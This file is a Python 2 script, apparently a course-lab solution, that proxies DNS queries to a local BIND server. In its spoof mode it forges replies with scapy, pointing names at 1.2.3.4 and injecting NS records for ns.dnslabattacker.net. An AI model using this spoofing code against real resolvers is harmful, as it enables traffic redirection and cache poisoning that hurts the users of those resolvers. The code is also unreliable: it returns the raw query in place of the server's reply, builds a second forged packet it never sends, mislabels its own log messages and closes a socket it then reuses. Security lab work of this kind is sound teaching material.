#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port

dns_port = args.dns_port 

# Flag to indicate if the proxy should spoof responses
SPOOF = args.spoof_response

# localhost IP
LOCAL = "127.0.0.1"

print("Server setup")

# SPOOF INFO
SPROOF_ADDR = "1.2.3.4"
SPROOF_NS_1 = "ns.dnslabattacker.net"

# server socket instantiation 
server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server.bind((LOCAL, port))

dns_client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
dns_client.settimeout(1)

#
dig_data = None 

# server loop 
while True: 
    print("Server running!")
    try: 
        dig_data, (dig_addr, dig_addr_p) = server.recvfrom(1024)
    except: 
        raise Exception("Failed to receive dig_data from dig!")
    
    if not dig_data:
        print("Breaking loop no response from dig!")
        break 


    print("Received dig data!")

    dns_client.sendto(dig_data, (LOCAL, dns_port))
    dns_data = None 
    
    #dns loop
    while True: 
        print("Waiting for DNS response!")
        try:
            dns_data, (dns_addr, dns_addr_p) = dns_client.recvfrom(1024)
        except Exception as e:
            print(e.message, e.args)
            break 
        if not dns_data:
            print("Breaking loop no response from DNS!")
            break
        
        packet = DNS(dns_data)
        
        # PART3
        if SPOOF:
            print("sending spoof data")
            if packet.haslayer(scapy.all.DNSRR):
                qname = packet[scapy.all.DNSQR].qname
                ns_ttl = packet['DNS'].ns.ttl
                dns_res = scapy.all.DNSRR(
                    rrname=qname,
                    rdata="1.2.3.4",
                    ttl=packet[scapy.all.DNSRR].ttl
                )
                packet.an = dns_res
                ns_response = scapy.all.DNSRR(
                    rrname=qname,type="NS",
                    rdata="ns.dnslabattacker.net",
                    ttl=ns_ttl) / \
                DNSRR(
                    rrname=qname,
                    type="NS",
                    rdata="ns.dnslabattacker.net",
                    ttl=ns_ttl)
                packet.ns = ns_response

                ip = packet.getlayer(IP)
                dns = packet.getlayer(DNS)
                pkt = DNS(
                    id=dns.id,
                    qd=dns.qd,
                    nscount=2,
                    an=DNSRR(rrname=dns.qd.qname, 
                    type='A', ttl=10,rdata='1.2.3.4'),
                    ns=DNSRR(rrname=dns.qd.qname, 
                    type = 'NS', 
                    ttl=100,
                    rdata="ns.dnslabattacker.net")/
                    DNSRR(
                        rrname=dns.qd.qname,
                        type='NS',ttl=100,
                        rdata="ns.dnslabattacker.net"))
                
                server.sendto(bytes(packet), (dig_addr, dig_addr_p))
                print("Sent non-spoofed data!")

        else:
            print("Sending non-spoofed data!")
            server.sendto(dig_data, (dig_addr, dig_addr_p))
            print("Sent non-spoofed data!") 
            break 

    
    dns_client.close()

server.close()
print('Server is closing!') 

        



    



